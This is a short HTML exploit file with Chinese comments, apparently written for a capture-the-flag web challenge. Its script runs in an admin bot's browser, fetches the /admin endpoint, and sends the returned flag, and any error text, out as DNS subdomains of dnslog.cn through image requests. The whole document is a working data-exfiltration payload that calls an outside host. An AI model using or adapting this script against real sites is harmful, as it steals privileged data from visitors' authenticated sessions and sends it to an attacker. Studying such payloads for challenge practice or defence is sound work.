<!-- exploit.html -->
<script>
  (async () => {
    try {
      // 请求 /admin（bot 已是 admin，会成功）
      const resp = await fetch('/admin');
      const data = await resp.json();
      let leak = data.flag || 'no-flag';

      // 清理为合法 DNS 子域名（只保留字母数字，替换其余为 -）
      leak = leak.replace(/[^a-zA-Z0-9]/g, '-').substring(0, 60);

      // 触发 DNS 查询（关键！）
      new Image().src = 'http://' + leak + '.mfvewv.dnslog.cn';
    } catch (e) {
      // 错误也外带（用于调试）
      const err = ('' + e).replace(/[^a-zA-Z0-9]/g, '-').substring(0, 60);
      new Image().src = 'http://ERR-' + err + '.so4ypk.dnslog.cn';
    }
  })();

</script>
